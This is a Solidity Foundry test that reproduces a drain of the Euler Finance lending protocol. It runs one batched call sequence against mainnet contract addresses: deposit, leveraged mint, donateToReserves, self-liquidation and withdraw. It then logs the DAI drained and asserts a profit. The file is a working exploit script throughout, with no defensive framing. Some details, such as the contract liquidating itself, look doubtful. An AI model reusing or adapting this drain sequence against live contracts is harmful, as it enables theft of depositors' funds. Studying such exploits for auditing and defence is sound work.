// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;
import "forge-std/Test.sol";

interface IERC20 { function balanceOf(address) external view returns (uint256); function approve(address, uint256) external returns (bool); }
interface IEulerExec {
    struct EulerBatchItem { bool allowError; address proxyAddr; bytes data; }
    function batchDispatch(EulerBatchItem[] calldata items, address[] calldata deferLiquidityChecks) external;
}
interface IEToken { function balanceOf(address) external view returns (uint256); function balanceOfUnderlying(address) external view returns (uint256); }
interface IDToken { function balanceOf(address) external view returns (uint256); }

contract TestEulerDirect is Test {
    address constant EULER = 0x27182842E098f60e3D576794A5bFFb0777E025d3;
    address constant EXEC = 0x59828FdF7ee634AaaD3f58B19fDBa3b03E2D9d80;
    address constant MARKETS = 0x3520d5a913427E6F0D6A83E07ccD4A4da316e4d3;
    address constant LIQUIDATION = 0x7123C8cBBD76c5C7fCC9f7150f23179bec0bA341;
    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant eDAI = 0xe025E3ca2bE02316033184551D4d3Aa22024D9DC;
    address constant dDAI = 0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686;

    function setUp() public {
        deal(DAI, address(this), 30_000_000e18);
    }

    function testFullDrainDirect() public {
        IERC20(DAI).approve(EULER, type(uint256).max);
        
        uint256 daiInEulerBefore = IERC20(DAI).balanceOf(EULER);
        emit log_named_uint("DAI in Euler", daiInEulerBefore);

        IEulerExec.EulerBatchItem[] memory items = new IEulerExec.EulerBatchItem[](6);
        items[0] = IEulerExec.EulerBatchItem(false, MARKETS, abi.encodeWithSignature("enterMarket(uint256,address)", 0, DAI));
        items[1] = IEulerExec.EulerBatchItem(false, eDAI, abi.encodeWithSignature("deposit(uint256,uint256)", 0, 20_000_000e18));
        items[2] = IEulerExec.EulerBatchItem(false, eDAI, abi.encodeWithSignature("mint(uint256,uint256)", 0, 180_000_000e18));
        items[3] = IEulerExec.EulerBatchItem(false, eDAI, abi.encodeWithSignature("donateToReserves(uint256,uint256)", 0, 100_000_000e18));
        items[4] = IEulerExec.EulerBatchItem(false, LIQUIDATION, abi.encodeWithSignature("liquidate(address,address,address,uint256,uint256)", address(this), DAI, DAI, type(uint256).max, 0));
        items[5] = IEulerExec.EulerBatchItem(false, eDAI, abi.encodeWithSignature("withdraw(uint256,uint256)", 1, type(uint256).max));

        address[] memory defer = new address[](2);
        defer[0] = address(this);
        defer[1] = address(uint160(uint160(address(this)) ^ 1));

        IEulerExec(EXEC).batchDispatch(items, defer);

        uint256 daiAfter = IERC20(DAI).balanceOf(address(this));
        uint256 daiInEulerAfter = IERC20(DAI).balanceOf(EULER);
        emit log_named_uint("DAI after", daiAfter);
        emit log_named_uint("DAI in Euler after", daiInEulerAfter);
        emit log_named_uint("DAI PROFIT", daiAfter);
        emit log_named_uint("DAI DRAINED", daiInEulerBefore > daiInEulerAfter ? daiInEulerBefore - daiInEulerAfter : 0);
        
        assertGt(daiAfter, 0, "should have DAI profit");
    }

    receive() external payable {}
}
